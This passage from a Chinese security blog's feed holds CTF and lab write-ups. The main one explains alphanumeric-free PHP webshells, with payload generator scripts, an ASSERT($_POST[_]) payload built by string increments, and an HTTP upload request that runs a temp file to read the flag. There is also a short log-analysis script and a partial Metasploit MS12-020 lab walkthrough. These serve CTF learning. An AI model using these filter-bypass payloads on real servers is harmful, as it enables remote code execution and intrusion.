class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><p>python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-comment"># author yu22x</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">xxx</span>\<span class="hljs-title">scripts</span>&gt;<span class="hljs-title">python</span> <span class="hljs-title">rce_or.py</span></span><br><span class="hljs-function">[+] <span class="hljs-title">your</span> <span class="hljs-title">function</span>：<span class="hljs-title">system</span></span><br><span class="hljs-function">[+] <span class="hljs-title">your</span> <span class="hljs-title">command</span>：<span class="hljs-title">cat</span> <span class="hljs-title">f</span>*</span><br><span class="hljs-function">(&quot;%13%19%13%14%05%0<span class="hljs-title">d</span>&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%00&quot;|&quot;%60%60%60%20%60%2<span class="hljs-title">a</span>&quot;);</span><br></code></pre></td></tr></table></figure><h4 id="3、取反"><a href="#3、取反" class="headerlink" title="3、取反"></a>3、取反</h4><p>我们知道，对一个字符进行两次取反，会得到原来的值，我们可以利用这个特性进行突破</p><p>脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//在命令行中运行</span><br><span class="hljs-comment">// 取反</span><br><span class="hljs-comment">// 无数字字母getshell</span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,PHP_EOL.<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br>    <span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br>    <span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,PHP_EOL.<span class="hljs-string">&#x27;\n[+]your command: &#x27;</span>);<br>    <span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;   <span class="hljs-comment">//两次取反可得到原结果</span><br>&#125;<br></code></pre></td></tr></table></figure><p>原理：我们通过将输入的字符进行取反，一般转化为不可见的字符，不会触发正则表达式，所以可以绕过，然后将其使用url编码后，再拼接上取反符号 <code>~</code> 这样执行，就相当于原来输入的shell了</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$s1</span> = <span class="hljs-string">&quot;phpinfo&quot;</span>;<br>    <span class="hljs-variable">$s1</span> = <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$s1</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s1</span>.PHP_EOL;<br>    <span class="hljs-variable">$s2</span> = ~<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$s1</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s2</span>.PHP_EOL;<br>    <span class="hljs-variable">$shell</span> = <span class="hljs-variable">$s1</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;shell: &quot;</span>.<span class="hljs-string">&quot;(~&quot;</span>.<span class="hljs-variable">$shell</span>.<span class="hljs-string">&quot;)();&quot;</span>;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span><br>phpinfo<br>shell: (~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<br></code></pre></td></tr></table></figure><p>此处，phpinfo 经过两次取反后还是为 phpinfo</p><p>我们将 第一次取反后的编码与 <code>(~</code>   <code>)();</code> 进行拼接</p><p>得到shell:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();  <span class="hljs-comment">// phpinfo();</span><br></code></pre></td></tr></table></figure><h4 id="4、自增"><a href="#4、自增" class="headerlink" title="4、自增"></a>4、自增</h4><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-string">&quot;A&quot;</span>++ =<span class="hljs-function">=&gt;</span> <span class="hljs-string">&quot;B&quot;</span><br><span class="hljs-string">&quot;B&quot;</span>++ =<span class="hljs-function">=&gt;</span> <span class="hljs-string">&quot;C&quot;</span><br></code></pre></td></tr></table></figure><p>如上，我们如果拿到了 字母A，那我们就可以通过++ 自增，获取所有大写字母</p><p>那么问题就是，我们如何才能够获得大写字母A呢？</p><blockquote><p>在php中，如果强制连接字符串和数组的话，数组将被转化为字符串，其值为 “Array”</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;&#x27;</span>.[];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);    <span class="hljs-comment">// 输出: String(5) &quot;Array&quot;</span><br></code></pre></td></tr></table></figure><p>根据以上知识点，我们只需取第一个字母，就可以获得大写字母 A 了 （也可以获得小写字母a）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-string">&quot;Array&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>[<span class="hljs-variable">$_</span>];  <span class="hljs-comment">//输出：A  我们没有定义 $_ 但是php默认赋值NULL==0</span><br><span class="hljs-variable">$_</span>++;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>[<span class="hljs-variable">$_</span>];  <span class="hljs-comment">//输出：r</span><br></code></pre></td></tr></table></figure><blockquote><p> $++对变量进行了自增操作,由于我们没有定义的值,PHP会给赋一个默认值NULL&#x3D;&#x3D;0,由此我们可以看出,我们可以在不使用任何数字的情况下,<strong>通过对未定义变量的自增操作来得到一个数字</strong> </p></blockquote><p>故有payload:</p><p>php5</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;   <span class="hljs-comment">//得到&quot;Array&quot;</span><br><span class="hljs-variable">$___</span> = <span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];   <span class="hljs-comment">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span><br><span class="hljs-variable">$__</span> = <span class="hljs-variable">$___</span>;   <span class="hljs-comment">//$__=&quot;A&quot;</span><br><span class="hljs-variable">$_</span> = <span class="hljs-variable">$___</span>;   <span class="hljs-comment">//$_=&quot;A&quot;</span><br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span><br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$___=&quot;AS&quot;</span><br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$___=&quot;ASS&quot;</span><br><span class="hljs-variable">$__</span> = <span class="hljs-variable">$_</span>;   <span class="hljs-comment">//$__=&quot;A&quot;</span><br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;E&quot;，此时$__=&quot;E&quot;</span><br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$___=&quot;ASSE&quot;</span><br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;R&quot;，此时$__=&quot;R&quot;</span><br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$___=&quot;ASSER&quot;</span><br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span><br><span class="hljs-variable">$___</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$___=&quot;ASSERT&quot;</span><br><span class="hljs-variable">$__</span> = <span class="hljs-variable">$_</span>;   <span class="hljs-comment">//$__=&quot;A&quot;</span><br><span class="hljs-variable">$____</span> = <span class="hljs-string">&quot;_&quot;</span>;   <span class="hljs-comment">//$____=&quot;_&quot;</span><br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span><br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$____=&quot;_P&quot;</span><br><span class="hljs-variable">$__</span> = <span class="hljs-variable">$_</span>;   <span class="hljs-comment">//$__=&quot;A&quot;</span><br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span><br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$____=&quot;_PO&quot;</span><br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span><br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$____=&quot;_POS&quot;</span><br><span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span><br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$____=&quot;_POST&quot;</span><br><span class="hljs-variable">$_</span> = <span class="hljs-variable">$$____</span>;   <span class="hljs-comment">//$_=$_POST</span><br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);   <span class="hljs-comment">//ASSERT($POST[_])</span><br></code></pre></td></tr></table></figure><h4 id="5、上传临时文件"><a href="#5、上传临时文件" class="headerlink" title="5、上传临时文件"></a>5、上传临时文件</h4><h5 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h5><blockquote><p>1、Linux下可用点 . 来执行shell脚本，等同于 source </p><p>2、Linux文件名可以使用glob通配符匹配</p><ul><li><code>*</code>可以代替0个及以上任意字符</li><li><code>?</code>可以代表1个任意字符</li></ul><p>3、PHP中POST上传文件会把我们上传的文件暂时存在&#x2F;tmp文件夹中，默认文件名是&#x2F;tmp&#x2F;phpXXXXXX，文件名最后6个字符是随机的大小写字母。</p></blockquote><p>假如我们要执行上传的shell文件，尝试如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">. /???/?????????<br></code></pre></td></tr></table></figure><p>但是我们会发现这样(通常情况下)并不能争取的执行文件，而是会报错，原因就是这样匹配到的文件太多了，系统不知道要执行哪个文件。</p><p>但是我们可以使用如下payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">. /???/????????[@-[]<br></code></pre></td></tr></table></figure><p>最后的<code>[@-[]</code>表示ASCII在 @ 和 [ 之间的字符，也就是大写字母，所以最后会执行的文件是tmp文件夹下结尾是大写字母的文件。由于PHP生成的tmp文件最后一位是随机的大小写字母，所以我们可能需要多试几次才能正确的执行我们的代码。(50%的几率嘛)</p><img src="https://s2.loli.net/2022/12/26/mO6f8C4XEW73SrH.png" alt="img" style="zoom: 50%;" /><p>因此，我们可以：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /?cmd=.+/???/????????[@-[] HTTP/<span class="hljs-number">1.1</span><br>Host: xxx.cn<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">83.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">83.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/webp,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=---------------------------5642920497686823912130808832</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Cookie: UM_distinctid=17424c95164f2-06a0a787df53968-4c302273-144000-17424c9516533d</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment">Content-Length: 291</span><br><span class="hljs-comment">​</span><br><span class="hljs-comment">-----------------------------5642920497686823912130808832</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;dd.txt&quot;</span><br><span class="hljs-comment">Content-Type: text/plain</span><br><span class="hljs-comment">​</span><br><span class="hljs-comment">#! /bin/sh</span><br><span class="hljs-comment">system(&#x27;cat /f*&#x27;);</span><br><span class="hljs-comment">-----------------------------5642920497686823912130808832--</span><br></code></pre></td></tr></table></figure><p>自己构造网页，上传带有shell命令的文件到服务器，并抓包，修改参数为 <code>.%20/???/????????[@-]]</code></p><p>这样就可以执行了（注意是在同一个数据包，否则tmp临时文件被删除）</p><p>ctfshow-web55可用上述解法</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">yu师傅-rce脚本</a></p><p><a href="https://xz.aliyun.com/t/8107#toc-0">无字母数字webshell总结-先知社区</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">p神-一些不包含数字和字母的webshell</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">p神-无字母数字webshell之提高篇</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行-无字母数字webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>闽盾杯复赛</title>
    <link href="/2023/08/24/%E9%97%BD%E7%9B%BE%E6%9D%AF%E5%A4%8D%E8%B5%9B/"/>
    <url>/2023/08/24/%E9%97%BD%E7%9B%BE%E6%9D%AF%E5%A4%8D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="签到好难战队wp"><a href="#签到好难战队wp" class="headerlink" title="签到好难战队wp"></a>签到好难战队wp</h2><h3 id="威胁情报分析2"><a href="#威胁情报分析2" class="headerlink" title="威胁情报分析2"></a>威胁情报分析2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf-8 -*-</span><br><span class="hljs-comment"># @Time : 2023/5/26 9:40</span><br><span class="hljs-comment"># @Author : Leekos</span><br><span class="hljs-comment"># @File : 威胁情报分析2.py</span><br><span class="hljs-comment"># @Software : PyCharm</span><br><br><br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> re<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;network.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>data = json.load(f)<br>dic = &#123;&#125;<br><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> data:<br>    DestHost = line[<span class="hljs-string">&#x27;DestHost&#x27;</span>]<br>    rel = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&quot;[a-zA-Z]+&quot;</span>,DestHost)<br>    <span class="hljs-keyword">if</span> rel:<br>        ls = DestHost.split(<span class="hljs-string">&quot;.&quot;</span>)<br>        length = <span class="hljs-built_in">len</span>(ls)<br>        <span class="hljs-keyword">if</span> length == <span class="hljs-number">2</span>:<br>            value = dic.get(DestHost,<span class="hljs-number">0</span>)<br>            dic[DestHost] = value + <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">elif</span> length == <span class="hljs-number">3</span>:<br>            value = dic.get(DestHost, <span class="hljs-number">0</span>)<br>            dic[DestHost] = value + <span class="hljs-number">1</span><br>            Host2 = ls[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;.&quot;</span>+ls[<span class="hljs-number">2</span>]<br>            value2 = dic.get(Host2,<span class="hljs-number">0</span>)<br>            dic[Host2] = value2 + <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">elif</span> length == <span class="hljs-number">4</span>:<br>            value = dic.get(DestHost, <span class="hljs-number">0</span>)<br>            dic[DestHost] = value + <span class="hljs-number">1</span><br>            Host2 = ls[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;.&quot;</span> + ls[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;.&quot;</span> + ls[<span class="hljs-number">2</span>]<br>            value2 = dic.get(Host2, <span class="hljs-number">0</span>)<br>            dic[Host2] = value2 + <span class="hljs-number">1</span><br>            Host3 = ls[<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;.&quot;</span>+ls[<span class="hljs-number">2</span>]<br>            value3 = dic.get(Host3, <span class="hljs-number">0</span>)<br>            dic[Host3] = value3 + <span class="hljs-number">1</span><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">sorted</span>(dic.items(), key=<span class="hljs-keyword">lambda</span> item:item[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>))<br></code></pre></td></tr></table></figure><p>运行脚本，flag在生成的字典的第三个值</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>闽盾杯复赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>蓝屏漏洞复现</title>
    <link href="/2023/08/24/%E8%93%9D%E5%B1%8F%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/08/24/%E8%93%9D%E5%B1%8F%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="【ms12-020】蓝屏漏洞复现"><a href="#【ms12-020】蓝屏漏洞复现" class="headerlink" title="【ms12-020】蓝屏漏洞复现"></a>【ms12-020】蓝屏漏洞复现</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul><li>工具：msf</li><li>攻击机：kali ，ip：192.168.56.128</li><li>靶机：win server 2003，ip：192.168.56.132</li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先打开工具msf</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfconsole</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032216402.png" alt="image-20230403221645243" style="zoom:33%;" /><p>然后搜索 <code>ms12-020</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> ms12-<span class="hljs-number">020</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032218833.png" alt="image-20230403221833720"></p><p>发现有两个模块，我们先使用模块0，去检测是否存在该漏洞</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>查看一下需要配置哪些参数</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032219135.png" alt="image-20230403221939042"></p><p>我们配置一下靶机ip(RHOSTS)</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.56.132</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032220259.png" alt="image-20230403222037226"></p><p>然后使用 <code>exploit</code>去执行：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032221850.png" alt="image-20230403222118804"></p><p>说明存在该漏洞</p><p>然后我们使用模块1，去执行该漏洞(也要配置相关参数)</p><p><img 